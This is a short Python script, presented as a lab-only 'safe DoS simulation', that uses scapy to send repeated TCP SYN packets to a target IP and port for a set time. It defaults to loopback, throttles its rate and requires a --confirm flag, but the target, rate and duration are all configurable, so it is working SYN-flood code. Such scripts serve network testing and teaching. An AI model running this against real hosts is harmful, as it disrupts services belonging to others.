#!/usr/bin/env python3
"""
Safe DoS simulation (lab-only).
Requires explicit --confirm and defaults to loopback.
Sends controlled SYN packets for a short duration.
"""
import argparse
import time
from scapy.all import send, IP, TCP
from utils.logger import setup_logger

def dos_simulation(target_ip="127.0.0.1", target_port=80, duration=5, interval=0.01):
    logger = setup_logger("dos_simulation")
    logger.info(f"Starting controlled DoS simulation against {target_ip}:{target_port} for {duration}s (interval={interval}s)")

    end_time = time.time() + duration
    pkt = IP(dst=target_ip)/TCP(dport=target_port, flags="S")

    count = 0
    while time.time() < end_time:
        send(pkt, verbose=0)
        count += 1
        time.sleep(interval)  # throttle to avoid uncontrolled flood

    logger.info(f"DoS simulation finished. Packets sent: {count}")


def main():
    parser = argparse.ArgumentParser(description="Safe DoS simulation (lab only)")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--duration", type=int, default=5, help="Duration in seconds (default: 5)")
    parser.add_argument("--interval", type=float, default=0.01, help="Interval between packets in seconds (default: 0.01)")
    parser.add_argument("--confirm", action="store_true", help="Confirm you run this in a lab environment")
    args = parser.parse_args()

    if not args.confirm:
        print("[!] This script will send packets to the target. Re-run with --confirm to proceed (lab-only).")
        return

    dos_simulation(target_ip=args.target, target_port=args.port, duration=args.duration, interval=args.interval)

if __name__ == "__main__":
    main()
